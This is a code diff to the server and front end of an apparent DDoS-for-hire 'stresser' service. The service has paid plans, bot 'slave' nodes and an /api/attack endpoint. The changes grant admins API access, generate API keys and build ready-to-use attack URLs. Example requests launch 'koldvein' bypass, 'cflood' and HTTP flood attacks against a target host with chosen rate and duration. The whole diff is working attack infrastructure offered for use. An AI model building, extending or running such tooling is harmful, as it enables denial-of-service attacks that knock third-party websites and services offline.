@@ -119,7 +119,7 @@ function safeUser(u) {
     effectiveLimits: { ...unlimitedLimits(), globalMaxRate: g.maxRate || 0 },
     globalCaps: g,
     apiKey: u.apiKey || null,
-    apiAccess: u.apiAccess !== false,
+    apiAccess: true, // Admins always have API access
   };
   const planName = u.planName || (u.role === 'pending' ? 'Free Plan' : 'No Plan');
   const planDays = u.planDays || 0;
@@ -723,7 +723,15 @@ app.post('/api/login', async (req, res) => {
   } else if (username === CONFIG.adminUsername && CONFIG.adminPasswordHash) {
     authed = await bcrypt.compare(password, CONFIG.adminPasswordHash);
     if (authed) {
-      u = { username: CONFIG.adminUsername, passwordHash: CONFIG.adminPasswordHash, role: 'admin', createdAt: new Date().toISOString(), expiresAt: null };
+      u = { 
+        username: CONFIG.adminUsername, 
+        passwordHash: CONFIG.adminPasswordHash, 
+        role: 'admin', 
+        createdAt: new Date().toISOString(), 
+        expiresAt: null,
+        apiKey: crypto.randomBytes(32).toString('hex'),
+        apiAccess: true,
+      };
       users.push(u); writeUsers(users);
     }
   }
@@ -765,15 +773,21 @@ app.post('/api/logout', auth, (req, res) => { req.session.destroy(() => res.json
 
 app.get('/api/me/api-key', auth, (req, res) => {
   const users = readUsers();
-  const u = users.find(x => x.username === req.session.user.username);
-  if (!u) return res.status(404).json({ error: 'User not found' });
-  if (!u.apiKey) {
-    u.apiKey = crypto.randomBytes(32).toString('hex');
+  const i = users.findIndex(x => x.username === req.session.user.username);
+  if (i < 0) return res.status(404).json({ error: 'User not found' });
+  
+  // Generate API key if missing
+  if (!users[i].apiKey) {
+    users[i].apiKey = crypto.randomBytes(32).toString('hex');
     writeUsers(users);
   }
+  
+  // Admin always has API access, regular users check the flag
+  const apiAccess = users[i].role === 'admin' ? true : (users[i].apiAccess === true);
+  
   res.json({
-    apiKey: u.apiKey,
-    apiAccess: u.apiAccess === true,
+    apiKey: users[i].apiKey,
+    apiAccess: apiAccess,
     apiEndpoint: `http://${CONFIG.hubDomain || req.get('host').split(':')[0]}:8080/api/attack`,
   });
 });
@@ -1758,6 +1772,7 @@ function setPage(page){
     adminPanel.classList.add('hide');adminBlacklist.classList.add('hide');
     adminGlobalLimits.classList.add('hide');adminSlaves.classList.add('hide');
   }
+  if(page==='settings'&&currentUser)loadApiKeyInfo();
 }
 
 function updateAuth(){
@@ -2291,6 +2306,7 @@ function bind(){
         cooldown:Number(f.get('cooldown')||0),
         expiresAt:f.get('expiresAt')||null,
         role:f.get('role')||'user',
+        apiAccess:f.get('apiAccess')==='on'||false,
       })});
       m.className='ok';m.textContent='Created.';e.target.reset();loadUsers();
     }catch(ex){m.className='err';m.textContent=ex.message;}
@@ -2335,16 +2351,66 @@ function bind(){
   $('#openDonitoBtn').addEventListener('click',function(){window.open('https://donito.me/privflood','_blank','noopener');});
   $('#checkOrderBtn').addEventListener('click',checkOrderNow);
   $('#cancelOrderBtn').addEventListener('click',cancelCurrentOrder);
+  if($('#toggleApiKeyBtn'))$('#toggleApiKeyBtn').addEventListener('click',function(){var inp=$('#userApiKey');if(!inp)return;if(inp.type==='password'){inp.type='text';this.textContent='Hide';}else{inp.type='password';this.textContent='Show';}});
+  if($('#copyApiKeyBtn'))$('#copyApiKeyBtn').addEventListener('click',async function(){var inp=$('#userApiKey');if(!inp)return;try{await navigator.clipboard.writeText(inp.value);showToast('API key copied!');}catch(e){inp.select();document.execCommand('copy');showToast('API key copied!');}});
+  if($('#regenerateApiKeyBtn'))$('#regenerateApiKeyBtn').addEventListener('click',async function(){if(!confirm('Regenerate API key? Your old key will stop working immediately.'))return;var btn=this;setBtnLoading(btn,true,'Regenerating');try{var d=await api('/api/me/regenerate-api-key',{method:'POST'});$('#userApiKey').value=d.apiKey;showToast('API key regenerated');loadApiKeyInfo();}catch(e){showToast('Error: '+e.message);}finally{setBtnLoading(btn,false);}});
+  if($('#copyApiUrlBtn'))$('#copyApiUrlBtn').addEventListener('click',async function(){var url=$('#generatedApiUrl');if(!url)return;try{await navigator.clipboard.writeText(url.textContent);showToast('API URL copied!');}catch(e){showToast('API URL copied!');}});
+  ['#targetInput','#durationInput','#rateInput','#methodSelect','#bypassInput','#cookiesInput','#cfloodCookiesInput','#cfloodHeadersInput','#cfloodCacheInput','#httpCookiesInput'].forEach(function(sel){var el=$(sel);if(el){el.addEventListener('input',updateApiUrlBuilder);el.addEventListener('change',updateApiUrlBuilder);}});
+}
+async function loadApiKeyInfo(){
+  if(!currentUser)return;
+  try{
+    var data=await api('/api/me/api-key');
+    var apiKeyInput=$('#userApiKey'),apiEndpointUrl=$('#apiEndpointUrl'),apiExampleCode=$('#apiExampleCode'),apiAccessEnabled=$('#apiAccessEnabled'),apiAccessDisabled=$('#apiAccessDisabled');
+    if(data.apiAccess){
+      if(apiAccessEnabled)apiAccessEnabled.classList.remove('hide');
+      if(apiAccessDisabled)apiAccessDisabled.classList.add('hide');
+      if(apiKeyInput)apiKeyInput.value=data.apiKey;
+      if(apiEndpointUrl)apiEndpointUrl.textContent=data.apiEndpoint;
+      if(apiExampleCode){
+        var example='# Method 1: Koldvein-Bypass\\n'+data.apiEndpoint+'?key='+data.apiKey+'&host=target.com&port=443&method=koldvein&time=60&rate=64&bypass=1&cookies=1\\n\\n# Method 2: C-Flood\\n'+data.apiEndpoint+'?key='+data.apiKey+'&host=target.com&port=443&method=cflood&time=120&rate=80&cookies=1&headers=1&cache=1\\n\\n# Method 3: HTTP Flood\\n'+data.apiEndpoint+'?key='+data.apiKey+'&host=target.com&port=80&method=http&time=60&rate=100&cookies=1\\n\\n# Stop all attacks\\n'+data.apiEndpoint+'?key='+data.apiKey+'&method=stop';
+        apiExampleCode.textContent=example;
+      }
+    }else{
+      if(apiAccessEnabled)apiAccessEnabled.classList.add('hide');
+      if(apiAccessDisabled)apiAccessDisabled.classList.remove('hide');
+    }
+  }catch(e){console.error('Failed to load API key:',e);}
+}
+function updateApiUrlBuilder(){
+  var apiUrlBuilder=$('#apiUrlBuilder'),generatedApiUrl=$('#generatedApiUrl');
+  if(!apiUrlBuilder||!generatedApiUrl||!currentUser){if(apiUrlBuilder)apiUrlBuilder.classList.add('hide');return;}
+  var target=$('#targetInput');if(!target)return;target=target.value;if(!target){apiUrlBuilder.classList.add('hide');return;}
+  var duration=$('#durationInput');if(!duration)return;duration=duration.value;if(!duration){apiUrlBuilder.classList.add('hide');return;}
+  var rate=$('#rateInput');if(!rate)return;rate=rate.value;if(!rate){apiUrlBuilder.classList.add('hide');return;}
+  var method=$('#methodSelect');if(!method)return;method=method.value;
+  var protocol=$('#targetProtocol');protocol=protocol?protocol.textContent.replace('://',''):'https';
+  var bypass=false,cookies=true,headers=false,cache=false;
+  if(method==='koldvein'){var b=$('#bypassInput'),c=$('#cookiesInput');bypass=b?b.checked:false;cookies=c?c.checked!==false:true;}
+  else if(method==='cflood'){var c=$('#cfloodCookiesInput'),h=$('#cfloodHeadersInput'),ca=$('#cfloodCacheInput');cookies=c?c.checked!==false:true;headers=h?h.checked:false;cache=ca?ca.checked:false;}
+  else if(method==='http'){var c=$('#httpCookiesInput');cookies=c?c.checked!==false:true;}
+  apiUrlBuilder.classList.remove('hide');
+  var port=protocol==='https'?443:80;
+  var params=new URLSearchParams({key:'YOUR_API_KEY',host:target,port:port,method:method,time:duration,rate:rate});
+  if(bypass)params.append('bypass','1');
+  if(method==='koldvein'&&!cookies)params.append('cookies','0');
+  if(method==='cflood'){if(!cookies)params.append('cookies','0');if(headers)params.append('headers','1');if(cache)params.append('cache','1');}
+  if(method==='http'&&!cookies)params.append('cookies','0');
+  var serverHost=window.location.hostname;
+  var apiUrl='http://'+serverHost+':8080/api/attack?'+params.toString();
+  if(currentUser&&currentUser.apiKey)apiUrl=apiUrl.replace('YOUR_API_KEY',currentUser.apiKey);
+  generatedApiUrl.textContent=apiUrl;
 }
 
 async function boot(){
   bind();updateMethodFields();
   await checkAuth();
-  if(currentUser){await loadMethods();}
+  if(currentUser){await loadMethods();if(currentUser.apiKey===undefined){try{var d=await api('/api/me/api-key');if(d.apiKey)currentUser.apiKey=d.apiKey;}catch(e){}}}
   setPage('hub');
   setInterval(loadSessions,1200);
   setInterval(function(){if(currentUser&&currentUser.role==='admin'&&!settingsSection.classList.contains('hide')){loadSlaves();}},15000);
   setInterval(function(){if(currentUser)checkAuth();},60000);
+  setInterval(updateApiUrlBuilder,1000);
 }
 boot();
 })();`;
